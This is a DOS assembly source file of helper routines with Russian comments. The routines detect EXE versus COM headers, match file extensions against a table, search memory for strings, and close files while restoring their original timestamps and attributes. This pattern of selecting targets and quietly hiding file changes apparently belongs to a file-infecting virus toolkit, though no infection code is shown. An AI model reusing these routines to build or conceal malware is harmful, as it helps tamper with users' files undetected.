;Сервисные процедуры
;(c) RedArc

;FormatFile - проверка внутреннего формата файла
;CmpExtFile - проверка расширения файла на соответствие таблице
;concatenat_string_in_memory - поиск строки в памяти
;ZerroBuffer - очистка буфера

;────────────────────────────────────────────────────────────────────────────
;Вход: ax - первые байты файла
;Выход:
;      CF = 1 - EXE-файл
;      CF = 0 - COM-файл
FormatFile proc near
           cmp ax,'MZ'
           je ExeFormat
           cmp ax,'ZM'
           je Exeformat
           clc
           ret
ExeFormat:
           stc
           ret
FormatFile endp

;────────────────────────────────────────────────────────────────────────────
;Вход: dx - имя файла
;      di - таблица расширений
;Выход:
;      CF = 1 - файл имеет другое расширение
;      CF = 0 - файл нам подходит
CmpExtFile proc near
           push ax bx cx dx si di
           mov si,di
@CEF1:
           xor ax,ax
           mov cx,13
           lodsb
           cmp al,0
           je ZerroByte
           xchg bx,ax
           mov di,dx
           call concatenat_string_in_memory
           cmp di,0ffffh
           jne ExtPresent
           add si,bx
           jmp @CEF1
ZerroByte:
           stc
           jmp short @CEFEnd
ExtPresent:
           clc
@CEFEnd:
           pop di si dx cx bx ax
           ret
CmpExtFile endp

;────────────────────────────────────────────────────────────────────────────
;ВХОД:
;DS:SI - АДРЕС ИСКОМОЙ СТРОКИ
;ES:DI - АДРЕС ДЛЯ ПОИСКА
;CX - КОЛИЧЕСТВО БАЙТ ДЛЯ СРАВНЕНИЯ
;BX - ДЛИНА ИСКОМОЙ СТРОКИ
;ВЫХОД:
;DI    - СМЕЩЕНИЕ В СЕГМЕНТЕ ЕСЛИ НАШЛИ, В ПРОТИВНОМ СЛУЧАЕ 0FFFFH
concatenat_string_in_memory proc near
             push ax bx cx dx
             cld
             mov al,byte ptr ds:[si]
next_find_string:
             repne scasb
             je found_first_char
             mov di,0ffffh
             jmp end_find_string
found_first_char:
             push cx
             push di
             push si
             mov cx,bx
             dec di
             repe cmpsb
             je found_string
             pop si
             pop di
             pop cx
             jmp next_find_string
found_string:
             pop si
             pop di
             dec di
             pop cx
end_find_string:
             pop dx cx bx ax
             ret
concatenat_string_in_memory endp

;────────────────────────────────────────────────────────────────────────────
CloseFile proc near
       mov ax,5701h
       mov cx,word ptr ds:[96h]
       mov dx,word ptr ds:[98h]
       int 21h
       jc CFError
       mov ah,3eh
       int 21h
       jc CFError
       xor cx,cx
       mov cl,byte ptr ds:[95h]
       mov ax,4301h
       int 21h
       jc CFError
       clc
       ret
CFError:
       stc
       ret
CloseFile endp

;────────────────────────────────────────────────────────────────────────────
ZerroBuffer proc near
            push ax cx di
            cld
            lea di,[Buffer]
            mov cx,512
            xor ax,ax
ZB0:
            stosw
            loop ZB0
            pop di cx ax
            ret
ZerroBuffer endp
